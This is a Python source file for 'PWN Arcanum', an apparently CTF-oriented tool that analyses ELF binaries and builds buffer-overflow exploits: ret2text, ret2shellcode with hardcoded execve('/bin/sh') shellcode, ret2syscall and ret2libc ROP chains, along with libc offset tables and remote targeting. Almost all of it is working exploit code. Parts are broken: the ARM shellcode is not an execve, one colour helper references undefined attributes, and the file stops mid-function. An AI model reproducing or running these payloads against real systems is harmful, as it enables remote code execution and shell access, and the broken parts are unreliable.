#!/usr/bin/env python3
"""PWN Arcanum v1.2 - Automated PWN Analysis & Exploitation Engine

Cross-platform (Windows / macOS / Linux) automated solver for simple PWN challenges:
  - ret2text (call win/backdoor function)
  - ret2shellcode (shellcode on stack/heap/bss)
  - ret2syscall (int 0x80 ROP chain)
  - ret2libc (leak + system("/bin/sh") via PLT/GOT)

Core idea: static analysis with pwntools ELF parser (no GDB/binutils dependency),
hardcoded multi-arch shellcode (no asm() needed), remote-first exploitation.

Usage:
  python pwn_arcanum.py binary
  python pwn_arcanum.py binary --remote host:port
  python pwn_arcanum.py binary --remote host:port --strategy auto
  python pwn_arcanum.py binary --offset 112 --strategy ret2text --func main
"""

import sys
import os
import re
import struct
import time
import argparse
from collections import defaultdict

# ---------------------------------------------------------------------------
# Color (graceful degrade if not a tty)
# ---------------------------------------------------------------------------
class C:
    RST = "\033[0m"
    BLD = "\033[1m"
    RED = "\033[91m"
    GRN = "\033[92m"
    YEL = "\033[93m"
    BLU = "\033[94m"
    MAG = "\033[95m"
    CYN = "\033[96m"

    @staticmethod
    def hdr(t): return f"{C.CYN}{C.BLD}{'='*22} {t} {'='*22}{C.RST}"
    @staticmethod
    def sub(t): return f"{C.BLU}{C.BLD}--- {t} ---{C.RST}"
    @staticmethod
    def flag(t): return f"{C.BG_RED}{C.WHT}{C.BLD}[FLAG] {t}{C.RST}" if hasattr(C,'WHT') else f"[FLAG] {t}"
    @staticmethod
    def hit(t): return f"{C.GRN}[+] {t}{C.RST}"
    @staticmethod
    def warn(t): return f"{C.YEL}[!] {t}{C.RST}"
    @staticmethod
    def info(t): return f"{C.CYN}[*] {t}{C.RST}"
    @staticmethod
    def err(t):  return f"{C.RED}[-] {t}{C.RST}"

BANNER = r"""
   ___|  |     |     |   _  |     \    _  _|  _  _|  _  _|  _  |
  |      |  -  |  -  |  . | |  -- <   | | | | |_ |_| |_ | | . | |
  |______|___|_|___|_|_|\__|_|_|_\_|  |___| |___|___|___|\___|
                                                          v1.2
"""

# ---------------------------------------------------------------------------
# Shellcode Database (hardcoded, no asm() needed, cross-platform)
# ---------------------------------------------------------------------------
SHELLCODES = {
    # Linux x86 execve("/bin/sh")
    "linux_x86_execve": (
        b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
        b"\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
    ),
    # Linux x86-64 execve("/bin/sh")
    "linux_x64_execve": (
        b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73"
        b"\x68\x57\x54\x5f\x6a\x3b\x58\x99\xb0\x3b\x0f\x05"
    ),
    # Linux x86-64 execve alternative (shorter)
    "linux_x64_execve_alt": (
        b"\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73"
        b"\x68\x53\x54\x5f\x52\x57\x54\x5e\x0f\x05"
    ),
    # Linux ARM (little endian) execve
    "linux_arm_execve": bytes.fromhex(
        "01080a0e"  # mov r0, r1
        "0100a0e3"  # mov r0, #1
    ),
}

def get_shellcode(arch):
    arch = arch.lower()
    if 'i386' in arch or arch == '32':
        return SHELLCODES["linux_x86_execve"]
    elif 'x86-64' in arch or arch == '64' or 'amd64' in arch:
        return SHELLCODES["linux_x64_execve"]
    return SHELLCODES["linux_x64_execve"]

# ---------------------------------------------------------------------------
# Imports (deferred to handle missing pwntools gracefully)
# ---------------------------------------------------------------------------
try:
    from pwn import *
    context.log_level = 'error'
    context.terminal = ['tmux', 'splitw', '-h']
    HAS_PWNTOOLS = True
except ImportError:
    HAS_PWNTOOLS = False

# ---------------------------------------------------------------------------
# BinaryAnalyzer: Static analysis with pwntools ELF (no GDB needed)
# ---------------------------------------------------------------------------
class BinaryAnalyzer:
    """Static analysis of ELF/PE binary for PWN challenge."""

    def __init__(self, filepath):
        self.filepath = filepath
        self.elf = None
        self.arch = 'amd64'
        self.bits = 64
        self.endian = 'little'
        self.protections = {}
        self.dangerous_funcs = {}
        self.win_funcs = []
        self.gadgets = []
        self.strings = []
        self.plt = {}
        self.got = {}
        self.has_libc = False
        self.cat_flag_gadgets = []  # addresses of 'lea rdi, [cat_flag_str]; ... call system'
        self.auto_offset = None     # auto-detected overflow offset
        self._load()

    def _load(self):
        if not HAS_PWNTOOLS:
            print(C.warn("pwntools not available, static analysis limited."))
            self._load_raw()
            return

        try:
            self.elf = ELF(self.filepath, checksec=False)
            self.arch = self.elf.arch
            self.bits = self.elf.bits
            self.endian = self.elf.endian
            self._analyze_protections()
            self._find_dangerous()
            self._find_win_funcs()
            self._find_cat_flag_xref()
            self._auto_detect_offset()
            self._search_gadgets()
            self._extract_strings()
            self._build_plt_got()
        except Exception as e:
            print(C.err(f"ELF load failed: {e}"))
            self._load_raw()

    def _load_raw(self):
        """Fallback: read file as bytes when pwntools unavailable."""
        with open(self.filepath, 'rb') as f:
            self.raw = f.read()
        # detect architecture by magic
        if len(self.raw) > 4 and self.raw[:4] == b'\x7fELF':
            ei_class = self.raw[4]
            self.bits = 64 if ei_class == 2 else 32
            self.arch = 'amd64' if self.bits == 64 else 'i386'
        self.protections = {'NX': 'unknown', 'Canary': 'unknown',
                            'PIE': 'unknown', 'RELRO': 'unknown'}

    def _analyze_protections(self):
        """Detect binary protections via ELF object attributes.
        Robust across pwntools versions (checksec() may return dict, str, or namedtuple).
        """
        self.protections = {}
        # NX: elf.nx is a bool (True = NX enabled)
        self.protections['NX'] = bool(getattr(self.elf, 'nx', False))
        # Canary: check for __stack_chk_fail in symbols
        has_canary = ('__stack_chk_fail' in self.elf.symbols
                      or '__stack_chk_fail_local' in self.elf.symbols)
        self.protections['Canary'] = has_canary
        # PIE: elf.pie is a bool (True = PIE enabled)
        self.protections['PIE'] = bool(getattr(self.elf, 'pie', False))
        # RELRO: elf.relro returns 'Full', 'Partial', or 'No'
        relro = getattr(self.elf, 'relro', None)
        self.protections['RELRO'] = relro if relro else 'No'

    def _find_dangerous(self):
        """Find dangerous functions: gets, read, scanf, strcpy, memcpy, etc."""
        danger_names = [
            'gets', 'read', 'scanf', '__isoc99_scanf', 'strcpy', 'strcat',
            'sprintf', 'memcpy', 'fgets', 'read', 'vuln', 'vulnerable',
            'overflow', 'backdoor', 'main', 'echo', 'input'
        ]
        for name in danger_names:
            if name in self.elf.symbols:
                addr = self.elf.symbols[name]
                self.dangerous_funcs[name] = addr
                # Check cross-references is hard statically, but flag presence

    def _find_win_funcs(self):
        """Find potential win/backdoor functions."""
        win_keywords = ['win', 'flag', 'backdoor', 'shell', 'system',
                        'execve', 'cat', 'read_flag', 'get_flag', 'secret']
        for sym_name in self.elf.symbols:
            for kw in win_keywords:
                if kw in sym_name.lower():
                    self.win_funcs.append((sym_name, self.elf.symbols[sym_name]))
                    break
        # Also check for system() in PLT
        if 'system' in self.elf.plt:
            self.win_funcs.append(('system@plt', self.elf.plt['system']))

    def _find_cat_flag_xref(self):
        """Find 'lea rdi, [cat_flag_string]' instructions via byte scanning.
        This detects inline 'system("cat /flag")' calls without needing objdump.

        x86-64: lea rdi, [rip+offset] is encoded as:
          48 8d 3d XX XX XX XX   (7 bytes, RIP-relative addressing)
        x86-32: lea rdi, [addr] is:
          bf XX XX XX XX         (mov edi, imm32)  OR
          8d 3d XX XX XX XX      (lea edi, [addr])
        """
        if not self.elf:
            return

        # Find "cat flag" related strings in the binary
        cat_strings = {}
        search_terms = [b'cat /flag', b'cat flag.txt', b'cat flag', b'/bin/sh',
                        b'cat /flag.txt', b'sh']
        for term in search_terms:
            try:
                addr = next(self.elf.search(term, writable=False), None)
                if addr is not None:
                    cat_strings[addr] = term.decode('ascii', errors='replace')
            except Exception:
                pass

        if not cat_strings:
            return

        # Read the .text section
        try:
            text_start = self.elf.get_section_by_name('.text').header.sh_addr
            text_size = self.elf.get_section_by_name('.text').header.sh_size
            text_data = self.elf.read(text_start, text_size)
        except Exception:
            # Fallback: scan entire binary
            text_start = 0
            with open(self.filepath, 'rb') as f:
                text_data = f.read()

        if self.bits == 64:
            # x86-64: 48 8d 3d XX XX XX XX  (lea rdi, [rip+offset])
            # The offset is relative to the NEXT instruction (addr+7)
            pattern = b'\x48\x8d\x3d'
            for i in range(len(text_data) - 7):
                if text_data[i:i+3] == pattern:
                    instr_addr = text_start + i
                    # Extract 4-byte signed offset (little-endian)
                    offset = struct.unpack('<i', text_data[i+3:i+7])[0]
                    # Target = addr of next instruction + offset
                    target = instr_addr + 7 + offset
                    if target in cat_strings:
                        # Found! Check if there's a call to system nearby
                        self.cat_flag_gadgets.append({
                            'addr': instr_addr,
                            'string': cat_strings[target],
                            'string_addr': target,
                            'desc': f'lea rdi, [{cat_strings[target]}] @ {hex(instr_addr)}'
                        })

            # Also check: mov edi, imm32 (bf XX XX XX XX) for 32-bit addresses
            for i in range(len(text_data) - 5):
                if text_data[i] == 0xbf:
                    instr_addr = text_start + i
                    target = struct.unpack('<I', text_data[i+1:i+5])[0]
                    if target in cat_strings:
                        self.cat_flag_gadgets.append({
                            'addr': instr_addr,
                            'string': cat_strings[target],
                            'string_addr': target,
                            'desc': f'mov edi, {hex(target)} [{cat_strings[target]}] @ {hex(instr_addr)}'
                        })
        else:
            # x86-32: lea edi, [addr] = 8d 3d XX XX XX XX
            pattern = b'\x8d\x3d'
            for i in range(len(text_data) - 6):
                if text_data[i:i+2] == pattern:
                    instr_addr = text_start + i
                    target = struct.unpack('<I', text_data[i+2:i+6])[0]
                    if target in cat_strings:
                        self.cat_flag_gadgets.append({
                            'addr': instr_addr,
                            'string': cat_strings[target],
                            'string_addr': target,
                            'desc': f'lea edi, [{cat_strings[target]}] @ {hex(instr_addr)}'
                        })

    def _auto_detect_offset(self):
        """Auto-detect overflow offset by scanning for:
        lea rdi, [rbp-X]  followed by  call gets/read/scanf
        Offset = X + 8 (saved rbp) for 64-bit, X + 4 for 32-bit

        x86-64 patterns:
          48 8d 7d XX   = lea rdi, [rbp+XX]  (XX is signed byte, negative for -X)
          48 8d bd XX XX XX XX = lea rdi, [rbp+XX32]  (32-bit displacement)
        """
        if not self.elf:
            return

        # Read .text section
        try:
            text_start = self.elf.get_section_by_name('.text').header.sh_addr
            text_size = self.elf.get_section_by_name('.text').header.sh_size
            text_data = self.elf.read(text_start, text_size)
        except Exception:
            return

        # Get addresses of dangerous functions (gets, read, scanf, etc.)
        vuln_addrs = set()
        for name, addr in self.dangerous_funcs.items():
            if name in ('gets', 'read', 'scanf', '__isoc99_scanf',
                        'strcpy', 'memcpy'):
                vuln_addrs.add(addr)

        # Also check PLT entries
        for name in ['gets', 'read', 'scanf', '__isoc99_scanf']:
            if name in self.plt:
                vuln_addrs.add(self.plt[name])

        if not vuln_addrs:
            return

        if self.bits == 64:
            # Pattern 1: 48 8d 7d XX (lea rdi, [rbp+signed_byte])
            # Followed within ~10 bytes by: call [vuln_func]
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x48\x8d\x7d':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]  # signed byte
                    buf_offset = -disp if disp < 0 else disp  # distance from rbp

                    # Look for 'call' within next 15 bytes
                    call_offset = None
                    for j in range(4, min(20, len(text_data) - i - 5)):
                        if text_data[i+j] == 0xe8:  # call rel32
                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
                            call_target = text_start + i + j + 5 + rel32
                            if call_target in vuln_addrs:
                                call_offset = j
                                break
                        # Also check: call [rax] = ff d0, call rax = ff d0
                        # or ff 15 (call [rip+ofs]) for PLT calls
                        if text_data[i+j] == 0xff:
                            if j + 1 < len(text_data) - i:
                                modrm = text_data[i+j+1]
                                # call [rip+disp32] = ff 15 XX XX XX XX
                                if modrm == 0x15 and j + 5 < len(text_data) - i:
                                    rel32 = struct.unpack('<i', text_data[i+j+2:i+j+6])[0]
                                    call_target = text_start + i + j + 6 + rel32
                                    if call_target in vuln_addrs:
                                        call_offset = j
                                        break

                    if call_offset is not None:
                        offset = buf_offset + 8  # +8 for saved rbp (64-bit)
                        self.auto_offset = offset
                        return

            # Pattern 2: 48 8d bd XX XX XX XX (lea rdi, [rbp+disp32])
            for i in range(len(text_data) - 7):
                if text_data[i:i+3] == b'\x48\x8d\xbd':
                    disp = struct.unpack('<i', text_data[i+3:i+7])[0]
                    buf_offset = -disp if disp < 0 else disp

                    for j in range(7, min(24, len(text_data) - i - 5)):
                        if text_data[i+j] == 0xe8:
                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
                            call_target = text_start + i + j + 5 + rel32
                            if call_target in vuln_addrs:
                                offset = buf_offset + 8
                                self.auto_offset = offset
                                return

            # Pattern 3: 48 8d 45 XX (lea rax, [rbp+byte]) + mov rdi,rax + call vuln
            # Common when compiler uses lea rax; mov rdi, rax instead of lea rdi
            for i in range(len(text_data) - 4):
                if text_data[i:i+3] == b'\x48\x8d\x45':
                    disp = struct.unpack('b', text_data[i+3:i+4])[0]
                    buf_offset = -disp if disp < 0 else disp

                    for j in range(4, min(25, len(text_data) - i - 5)):
                        if text_data[i+j] == 0xe8:
                            rel32 = struct.unpack('<i', text_data[i+j+1:i+j+5])[0]
                            call_target = text_start + i + j + 5 + rel32
                            if call_target in vuln_addrs:
                                offset = buf_offset + 8
                                self.auto_offset = offset
                                return

    def _search_gadgets(self):
        """Search for ROP gadgets using pwntools ROP."""
        try:
            self.rop = ROP(self.elf)
            # Find key gadgets
            self.gadgets = []
            # pop rdi; ret  (for x64)
            try:
                g = self.rop.find_gadget(['pop rdi', 'ret'])
                if g: self.gadgets.append(('pop rdi; ret', g[0]))
            except: pass
            # pop rsi; ret
            try:
                g = self.rop.find_gadget(['pop rsi', 'ret'])
                if g: self.gadgets.append(('pop rsi; ret', g[0]))
            except: pass
            # pop rdx; ret
            try:
                g = self.rop.find_gadget(['pop rdx', 'ret'])
                if g: self.gadgets.append(('pop rdx; ret', g[0]))
            except: pass
            # ret (stack alignment)
            try:
                g = self.rop.find_gadget(['ret'])
                if g: self.gadgets.append(('ret', g[0]))
            except: pass
            # int 0x80
            try:
                g = self.rop.find_gadget(['int 0x80'])
                if g: self.gadgets.append(('int 0x80', g[0]))
            except: pass
            # syscall
            try:
                g = self.rop.find_gadget(['syscall'])
                if g: self.gadgets.append(('syscall', g[0]))
            except: pass
        except Exception as e:
            print(C.warn(f"ROP gadget search failed: {e}"))

    def _extract_strings(self):
        """Extract interesting strings from binary."""
        try:
            with open(self.filepath, 'rb') as f:
                data = f.read()
            # ASCII strings >= 4 chars
            found = re.findall(rb'[\x20-\x7e]{4,}', data)
            interesting = []
            for s in found:
                s = s.decode('ascii', errors='replace')
                # filter interesting
                if any(kw in s.lower() for kw in ['flag', 'bin/sh', 'sh', 'cat',
                        'system', 'bash', '/bin', 'flag.txt', 'key', 'secret',
                        'input', 'name', 'welcome', 'overflow', 'pwn']):
                    interesting.append(s)
            self.strings = interesting[:50]
        except Exception:
            self.strings = []

    def _build_plt_got(self):
        """Build PLT and GOT address maps."""
        if not self.elf:
            return
        self.plt = dict(self.elf.plt)
        self.got = dict(self.elf.got)

    def report(self):
        lines = []
        lines.append(C.hdr("BINARY ANALYSIS"))
        lines.append(f"  File: {self.filepath}")
        lines.append(f"  Arch: {self.arch} ({self.bits}-bit, {self.endian})")

        # Protections
        lines.append(C.sub("Protections"))
        for name, val in self.protections.items():
            color = C.RED if val else C.GRN
            lines.append(f"    {name}: {color}{val}{C.RST}")

        # Dangerous functions
        if self.dangerous_funcs:
            lines.append(C.sub(f"Dangerous functions ({len(self.dangerous_funcs)})"))
            for name, addr in sorted(self.dangerous_funcs.items(),
                                     key=lambda x: x[1]):
                lines.append(f"    {name}: {hex(addr)}")
        else:
            lines.append(C.info("No dangerous functions found in symbol table"))

        # Win functions
        if self.win_funcs:
            lines.append(C.sub(f"Win/Backdoor functions ({len(self.win_funcs)})"))
            for name, addr in self.win_funcs:
                lines.append(f"    {C.GRN}{name}{C.RST}: {hex(addr)}")

        # Cat flag gadgets (inline system("cat /flag") detection)
        if self.cat_flag_gadgets:
            lines.append(C.sub(f"Cat-flag gadgets ({len(self.cat_flag_gadgets)})"))
            for g in self.cat_flag_gadgets:
                lines.append(f"    {C.GRN}{g['desc']}{C.RST}")

        # Auto-detected offset
        if self.auto_offset:
            lines.append(C.sub("Auto-detected overflow offset"))
            lines.append(f"    {C.GRN}{self.auto_offset}{C.RST} bytes (from lea rdi,[rbp-X] + call gets/read/scanf)")

        # PLT
        if self.plt:
            lines.append(C.sub(f"PLT entries ({len(self.plt)})"))
            for name, addr in sorted(self.plt.items()):
                lines.append(f"    {name}@plt: {hex(addr)}")

        # GOT
        if self.got:
            lines.append(C.sub(f"GOT entries ({len(self.got)})"))
            for name, addr in sorted(self.got.items()):
                lines.append(f"    {name}@got: {hex(addr)}")

        # Gadgets
        if self.gadgets:
            lines.append(C.sub(f"ROP gadgets ({len(self.gadgets)})"))
            for name, addr in self.gadgets:
                lines.append(f"    {C.GRN}{name}{C.RST}: {hex(addr)}")

        # Strings
        if self.strings:
            lines.append(C.sub(f"Interesting strings ({len(self.strings)})"))
            for s in self.strings[:15]:
                lines.append(f"    \"{s[:80]}\"")

        return lines
# ===================================================================
# Offset Finder: Auto-detect buffer overflow offset
# ===================================================================
class OffsetFinder:
    """Auto-detect overflow offset using cyclic pattern."""

    @staticmethod
    def cyclic_pattern(length=200):
        """Generate a cyclic pattern (pwntools-compatible, standalone)."""
        pattern = b''
        # Use a simple de Bruijn sequence approach
        # Pattern: aaaabaaacaaadaaa... (standard pwntools cyclic)
        if HAS_PWNTOOLS:
            return cyclic(length)
        # standalone implementation
        letters = b'abcdefghijklmnopqrstuvwxyz'
        i = 0
        while len(pattern) < length:
            # Generate 4-byte chunks like: aaaa, aaab, aaac, ...
            # Simplified: use pattern that can be traced back
            chunk = letters[i // 26: i // 26 + 1] * 3 + letters[i % 26]
            pattern += chunk
            i += 1
        return pattern[:length]

    @staticmethod
    def find_offset(crash_value, length=200):
        """Find offset from cyclic pattern crash value."""
        if HAS_PWNTOOLS:
            try:
                return cyclic_find(crash_value)
            except:
                pass
        # standalone search
        pattern = OffsetFinder.cyclic_pattern(length)
        if isinstance(crash_value, int):
            crash_bytes = crash_value.to_bytes(4, 'little')
        else:
            crash_bytes = crash_value
        idx = pattern.find(crash_bytes)
        return idx if idx >= 0 else -1


# ===================================================================
# ExploitBuilder: Generate payloads for different strategies
# ===================================================================
class ExploitBuilder:
    """Build exploit payloads for various PWN strategies."""

    def __init__(self, analyzer):
        self.a = analyzer
        self.bits = analyzer.bits
        self.arch = analyzer.arch
        self.pack_fmt = '<Q' if self.bits == 64 else '<I'
        self.word_size = self.bits // 8

    def _p(self, addr):
        """Pack an address."""
        return struct.pack(self.pack_fmt, addr)

    def _align(self, payload, offset):
        """Pad payload to exactly offset bytes."""
        if len(payload) < offset:
            payload += b'A' * (offset - len(payload))
        return payload

    # -----------------------------------------------------------------
    # Strategy 1: ret2text - call a win/backdoor function
    # -----------------------------------------------------------------
    def ret2text(self, offset, win_addr=None, win_name=None, args=None):
        """ret2text: overwrite return address to call win function.

        Args:
            offset: buffer overflow offset to return address
            win_addr: address of win function (if known)
            win_name: name of win function to look up
            args: list of arguments to pass to the function
        """
        if win_addr is None:
            if win_name:
                # Look up in symbols
                if self.a.elf and win_name in self.a.elf.symbols:
                    win_addr = self.a.elf.symbols[win_name]
                else:
                    return None, f"Win function '{win_name}' not found in symbols"
            elif self.a.win_funcs:
                # Use first win function found
                win_name, win_addr = self.a.win_funcs[0]
            else:
                return None, "No win function found"

        # Handle 32-bit vs 64-bit calling convention
        if self.bits == 32:
            # cdecl: args on stack
            payload = b'A' * offset
            payload += self._p(win_addr)
            if args:
                # fake return address + args
                payload += self._p(0xdeadbeef)  # fake return
                for arg in args:
                    payload += self._p(arg)
            else:
                payload += self._p(0xdeadbeef)  # fake return
        else:
            # x86-64: args in rdi, rsi, rdx, rcx, r8, r9
            # Need pop rdi; ret gadget for first arg
            payload = b'A' * offset

            # Stack alignment: add a 'ret' gadget for 16-byte alignment
            ret_gadget = None
            for name, addr in self.a.gadgets:
                if name == 'ret':
                    ret_gadget = addr
                    break

            if ret_gadget and not args:
                # Add ret for alignment
                payload += self._p(ret_gadget)

            if args and len(args) >= 1:
                # Need pop rdi; ret
                pop_rdi = None
                for name, addr in self.a.gadgets:
                    if name == 'pop rdi; ret':
                        pop_rdi = addr
                        break
                if pop_rdi is None:
                    return None, "No 'pop rdi; ret' gadget found for x64 args"

                if ret_gadget:
                    payload += self._p(ret_gadget)  # alignment
                payload += self._p(pop_rdi)
                payload += self._p(args[0])
                payload += self._p(win_addr)
            else:
                payload += self._p(win_addr)
                payload += self._p(0xdeadbeef)  # fake return

        desc = (f"ret2text: overflow {offset} bytes -> "
                f"call {win_name or hex(win_addr)}")
        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 2: ret2shellcode - jump to shellcode on stack/bss
    # -----------------------------------------------------------------
    def ret2shellcode(self, offset, shellcode_addr=None, shellcode=None):
        """ret2shellcode: place shellcode and jump to it.

        Args:
            offset: overflow offset
            shellcode_addr: address where shellcode will be (stack/bss/heap)
            shellcode: shellcode bytes (default: execve /bin/sh)
        """
        if shellcode is None:
            shellcode = get_shellcode(self.arch)

        if shellcode_addr is None:
            return None, "Need shellcode_addr (stack/bss address) for ret2shellcode"

        # Layout: padding + shellcode_addr + NOP sled + shellcode
        # Or: padding + NOP sled + shellcode + shellcode_addr
        # Common CTF layout: input goes to a known buffer, return to it

        # Layout A: padding -> retAddr=shellcode_addr
        if offset >= len(shellcode):
            # Shellcode before return address
            payload = shellcode
            payload += b'A' * (offset - len(shellcode))
            payload += self._p(shellcode_addr)
            desc = (f"ret2shellcode: shellcode before ret, "
                    f"offset={offset}, jump to {hex(shellcode_addr)}")
        else:
            # Shellcode after return address
            payload = b'A' * offset
            payload += self._p(shellcode_addr)

        desc = (f"ret2shellcode: jump to {hex(shellcode_addr)}, "
                f"sc_len={len(shellcode)}")
        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 3: ret2syscall - ROP chain for execve
    # -----------------------------------------------------------------
    def ret2syscall(self, offset):
        """ret2syscall: build ROP chain for execve("/bin/sh", 0, 0).

        x86:  eax=0xb, ebx="/bin/sh", ecx=0, edx=0, int 0x80
        x64:  rax=0x3b, rdi="/bin/sh", rsi=0, rdx=0, syscall
        """
        gadgets = dict(self.a.gadgets)
        elf = self.a.elf
        if elf is None:
            return None, "ELF not loaded, cannot build ret2syscall"

        # Find /bin/sh string in binary
        binsh_addr = None
        try:
            binsh_addr = next(elf.search(b'/bin/sh\x00'), None)
        except (StopIteration, Exception):
            pass

        if binsh_addr is None:
            # Try to find /bin/sh without null
            try:
                binsh_addr = next(elf.search(b'/bin/sh'), None)
            except (StopIteration, Exception):
                pass

        payload = b'A' * offset

        if self.bits == 32:
            # Need: eax=0xb, ebx=binsh, ecx=0, edx=0, int 0x80
            try:
                pop_eax = self.a.rop.find_gadget(['pop eax', 'ret'])[0]
            except:
                # Try pop eax; pop ebx; ret or similar
                pop_eax = None

            try:
                pop_edx_ecx_ebx = self.a.rop.search(
                    move=0, regs=['edx','ecx','ebx'])[0]
            except:
                pop_edx_ecx_ebx = None

            try:
                int80 = self.a.rop.find_gadget(['int 0x80'])[0]
            except:
                int80 = None

            if not all([pop_eax, pop_edx_ecx_ebx, int80, binsh_addr]):
                missing = []
                if not pop_eax: missing.append('pop eax')
                if not pop_edx_ecx_ebx: missing.append('pop edx/ecx/ebx')
                if not int80: missing.append('int 0x80')
                if not binsh_addr: missing.append('/bin/sh string')
                return None, f"Missing: {', '.join(missing)}"

            payload += self._p(pop_edx_ecx_ebx)
            payload += self._p(0)           # edx = 0
            payload += self._p(0)           # ecx = 0
            payload += self._p(binsh_addr)  # ebx = "/bin/sh"
            payload += self._p(pop_eax)
            payload += self._p(0xb)         # eax = 11
            payload += self._p(int80)

        else:
            # x64: rax=0x3b, rdi=binsh, rsi=0, rdx=0, syscall
            pop_rdi = gadgets.get('pop rdi; ret')
            pop_rsi = gadgets.get('pop rsi; ret')
            pop_rdx = gadgets.get('pop rdx; ret')
            syscall = gadgets.get('syscall')

            # Also try pop rax
            pop_rax = None
            try:
                pop_rax = self.a.rop.find_gadget(['pop rax', 'ret'])[0]
            except:
                pass

            if not all([pop_rdi, pop_rsi, pop_rdx, syscall, binsh_addr, pop_rax]):
                missing = []
                if not pop_rdi: missing.append('pop rdi')
                if not pop_rsi: missing.append('pop rsi')
                if not pop_rdx: missing.append('pop rdx')
                if not pop_rax: missing.append('pop rax')
                if not syscall: missing.append('syscall')
                if not binsh_addr: missing.append('/bin/sh')
                return None, f"Missing: {', '.join(missing)}"

            payload += self._p(pop_rdi)
            payload += self._p(binsh_addr)
            payload += self._p(pop_rsi)
            payload += self._p(0)
            payload += self._p(pop_rdx)
            payload += self._p(0)
            payload += self._p(pop_rax)
            payload += self._p(0x3b)
            payload += self._p(syscall)

        desc = f"ret2syscall: execve(\"/bin/sh\", 0, 0) ROP chain, offset={offset}"
        return payload, desc

    # -----------------------------------------------------------------
    # Strategy 4: ret2libc - leak libc + system("/bin/sh")
    # -----------------------------------------------------------------
    def ret2libc(self, offset, remote_host=None, remote_port=None):
        """ret2libc: leak libc address via puts/printf, then system("/bin/sh").

        This is a two-stage exploit:
        Stage 1: leak GOT entry -> calculate libc base
        Stage 2: return to main -> send second payload with system("/bin/sh")

        Returns: (payload_stage1, desc) tuple
        """
        elf = self.a.elf
        if elf is None:
            return None, "ELF not loaded"

        gadgets = dict(self.a.gadgets)
        pop_rdi = gadgets.get('pop rdi; ret')
        ret_gadget = gadgets.get('ret')

        # Find a function to leak through (puts/printf/write)
        leak_func = None
        leak_name = None
        for name in ['puts', 'printf', 'write']:
            if name in self.a.plt:
                leak_func = self.a.plt[name]
                leak_name = name
                break

        if leak_func is None:
            return None, "No puts/printf/write in PLT for leaking"

        # Find a GOT entry to leak (prefer puts/printf)
        leak_got = None
        leak_got_name = None
        for name in ['puts', 'printf', 'write', '__libc_start_main']:
            if name in self.a.got:
                leak_got = self.a.got[name]
                leak_got_name = name
                break

        if leak_got is None:
            return None, "No suitable GOT entry to leak"

        # Find main function to return to
        main_addr = None
        for name in ['main', '_start', 'vuln', 'vulnerable']:
            if name in elf.symbols:
                main_addr = elf.symbols[name]
                break

        if main_addr is None:
            return None, "Cannot find main/vuln to return to for stage 2"

        if self.bits == 32:
            # 32-bit: puts@got on stack, call puts@plt, ret to main
            payload = b'A' * offset
            payload += self._p(leak_func)
            payload += self._p(main_addr)    # return to main after leak
            payload += self._p(leak_got)     # arg: GOT entry to leak
        else:
            # 64-bit: pop rdi; ret -> GOT addr -> puts@plt -> main
            if pop_rdi is None:
                return None, "No 'pop rdi; ret' gadget for x64 ret2libc"

            payload = b'A' * offset
            if ret_gadget:
                payload += self._p(ret_gadget)  # stack alignment
            payload += self._p(pop_rdi)
            payload += self._p(leak_got)
            payload += self._p(leak_func)
            payload += self._p(main_addr)

        desc = (f"ret2libc stage1: leak {leak_got_name}@GOT via "
                f"{leak_name}@PLT, return to {hex(main_addr)}")
        return payload, desc

    def ret2libc_stage2(self, offset, libc_base, system_offset,
                        binsh_offset, ret_addr=None):
        """Build stage 2 payload for ret2libc.

        Args:
            offset: overflow offset
            libc_base: calculated libc base address
            system_offset: offset of system() in libc
            binsh_offset: offset of "/bin/sh" in libc
            ret_addr: optional ret gadget for alignment
        """
        system_addr = libc_base + system_offset
        binsh_addr = libc_base + binsh_offset

        payload = b'A' * offset

        if self.bits == 32:
            payload += self._p(system_addr)
            payload += self._p(0xdeadbeef)  # fake return
            payload += self._p(binsh_addr)
        else:
            pop_rdi = None
            for name, addr in self.a.gadgets:
                if name == 'pop rdi; ret':
                    pop_rdi = addr
                    break

            if ret_addr:
                payload += self._p(ret_addr)  # alignment
            if pop_rdi:
                payload += self._p(pop_rdi)
                payload += self._p(binsh_addr)
            payload += self._p(system_addr)

        desc = (f"ret2libc stage2: system({hex(binsh_addr)}), "
                f"base={hex(libc_base)}")
        return payload, desc
# ===================================================================
# Libc Database (embedded offsets for common CTF libcs)
# ===================================================================
# Common libc offsets (can be overridden with --libc flag)
LIBC_OFFSETS = {
    # libc6_2.27-3ubuntu1_amd64 (Ubuntu 18.04)
    "ubuntu18_amd64": {
        "system": 0x4f440,
        "binsh": 0x1b3e1a,
        "puts": 0x809c0,
    },
    # libc6_2.23-0ubuntu11_amd64 (Ubuntu 16.04)
    "ubuntu16_amd64": {
        "system": 0x45390,
        "binsh": 0x18cd57,
        "puts": 0x6f690,
    },
    # libc6_2.31-0ubuntu9_amd64 (Ubuntu 20.04)
    "ubuntu20_amd64": {
        "system": 0x55410,
        "binsh": 0x1b75aa,
        "puts": 0x875a0,
    },
    # libc6_2.27-3ubuntu1_i386
    "ubuntu18_i386": {
        "system": 0x3cd10,
        "binsh": 0x17b8cf,
        "puts": 0x67360,
    },
}

# ===================================================================
# PWNArcanum: Main Engine
# ===================================================================
class PWNArcanum:
    """Main PWN analysis and exploitation engine."""

    def __init__(self, binary_path, verbose=False):
        self.binary_path = binary_path
        self.verbose = verbose
        self.analyzer = None
        self.builder = None
        self.strategy = None
        self.payload = None
        self.payload_desc = None
        self.offset = None
        self.remote_host = None
        self.remote_port = None
        self.libc_offsets = None
        self.leaked_libc_base = None

    def analyze(self):
        """Perform static analysis on the binary."""
        self.analyzer = BinaryAnalyzer(self.binary_path)
        self.analyzer.report_lines = self.analyzer.report()
        self.builder = ExploitBuilder(self.analyzer)
        return self.analyzer

    def print_report(self):
        """Print the analysis report."""
        for line in self.analyzer.report_lines:
            print(line)

    def recommend_strategy(self):
        """Automatically recommend an exploitation strategy."""
        a = self.analyzer
